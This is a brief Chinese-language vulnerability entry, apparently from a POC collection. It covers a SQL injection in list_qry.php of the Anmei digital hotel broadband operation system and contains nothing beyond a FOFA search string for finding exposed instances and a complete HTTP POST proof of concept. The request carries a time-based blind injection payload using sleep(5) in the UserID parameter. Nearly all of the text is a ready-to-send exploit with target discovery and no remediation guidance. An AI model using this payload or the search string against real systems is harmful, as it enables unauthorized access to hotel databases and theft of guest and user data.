## 安美数字酒店宽带运营系统list_qry.phpSQL注入漏洞


## fofa
```
title=酒店宽带运营系统
```

## POC
```
POST /user/list_qry.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 94

UserID=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z&starttime=2023-01-01&stoptime=2023-12-31
```
